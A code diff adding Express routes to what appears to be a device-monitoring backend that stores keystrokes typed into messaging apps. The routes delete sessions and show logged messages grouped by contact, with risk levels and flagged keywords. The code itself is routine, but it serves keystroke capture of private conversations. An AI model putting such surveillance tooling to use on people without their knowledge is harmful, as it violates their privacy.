@@ -1365,4 +1365,125 @@ router.get('/keystrokes/:deviceId/stats', async (req, res) => {
   }
 });
 
+// DELETE: Delete a single keystroke session
+router.delete('/keystrokes/:deviceId/session/:sessionId', async (req, res) => {
+  try {
+    const { deviceId, sessionId } = req.params;
+    
+    // Find device
+    let device = await Device.findOne({ deviceId: deviceId });
+    if (!device && mongoose.Types.ObjectId.isValid(deviceId)) {
+      device = await Device.findById(deviceId);
+    }
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    const result = await KeystrokeSession.findOneAndDelete({ 
+      sessionId: sessionId, 
+      deviceId: device.deviceId 
+    });
+    
+    if (!result) {
+      return res.status(404).json({ error: 'Session not found' });
+    }
+    
+    console.log(`[Keystrokes] Deleted session ${sessionId}`);
+    res.json({ success: true, message: 'Session deleted' });
+    
+  } catch (error) {
+    console.error('Delete keystroke session error:', error);
+    res.status(500).json({ error: 'Failed to delete session' });
+  }
+});
+
+// DELETE: Delete all keystroke sessions for a device
+router.delete('/keystrokes/:deviceId', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    
+    // Find device
+    let device = await Device.findOne({ deviceId: deviceId });
+    if (!device && mongoose.Types.ObjectId.isValid(deviceId)) {
+      device = await Device.findById(deviceId);
+    }
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    const result = await KeystrokeSession.deleteMany({ deviceId: device.deviceId });
+    
+    console.log(`[Keystrokes] Deleted all ${result.deletedCount} sessions for device ${device.name}`);
+    res.json({ success: true, deleted: result.deletedCount });
+    
+  } catch (error) {
+    console.error('Delete all keystrokes error:', error);
+    res.status(500).json({ error: 'Failed to delete keystrokes' });
+  }
+});
+
+// GET: Get keystrokes grouped by contact (WhatsApp-style chat view)
+router.get('/keystrokes/:deviceId/grouped', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    
+    // Find device
+    let device = await Device.findOne({ deviceId: deviceId });
+    if (!device && mongoose.Types.ObjectId.isValid(deviceId)) {
+      device = await Device.findById(deviceId);
+    }
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    // Get all sessions grouped by contact and app
+    const groupedData = await KeystrokeSession.aggregate([
+      { $match: { deviceId: device.deviceId } },
+      { $sort: { lastMessageTime: -1 } },
+      { 
+        $group: {
+          _id: { app: '$appName', contact: '$contactName' },
+          sessions: { 
+            $push: {
+              sessionId: '$sessionId',
+              messages: '$messages',
+              messageCount: '$messageCount',
+              riskLevel: '$riskLevel',
+              flaggedKeywords: '$flaggedKeywords',
+              firstMessageTime: '$firstMessageTime',
+              lastMessageTime: '$lastMessageTime'
+            }
+          },
+          totalMessages: { $sum: '$messageCount' },
+          lastActivity: { $max: '$lastMessageTime' },
+          highestRisk: { $max: '$riskLevel' }
+        }
+      },
+      { $sort: { lastActivity: -1 } }
+    ]);
+    
+    // Transform to chat-friendly format
+    const chats = groupedData.map(g => ({
+      app: g._id.app,
+      contact: g._id.contact,
+      totalMessages: g.totalMessages,
+      lastActivity: g.lastActivity,
+      highestRisk: g.highestRisk,
+      sessions: g.sessions.sort((a, b) => 
+        new Date(b.lastMessageTime) - new Date(a.lastMessageTime)
+      )
+    }));
+    
+    res.json({
+      success: true,
+      chats,
+      totalChats: chats.length
+    });
+    
+  } catch (error) {
+    console.error('Get grouped keystrokes error:', error);
+    res.status(500).json({ error: 'Failed to get grouped keystrokes' });
+  }
+});
+
 module.exports = router;
